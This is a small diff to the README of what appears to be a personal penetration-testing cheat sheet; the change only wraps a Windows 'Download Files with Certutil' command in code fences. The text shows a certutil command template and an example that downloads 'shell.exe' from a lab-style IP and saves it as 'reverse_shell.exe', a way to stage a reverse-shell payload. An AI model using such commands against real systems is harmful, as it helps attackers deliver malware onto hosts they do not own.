@@ -10,7 +10,9 @@ In this repo I collect all commands, links, techniques and tricks i found during
 
 ## Windows
 ### Download Files with Certutil
+```bash
 certutil.exe -urlcache -f http://<ip>:<port>/<filename> <localfilename>
+```
 Example:
 ```bash
 certutil.exe -urlcache -f http://10.10.14.37:8080/shell.exe reverse_shell.exe
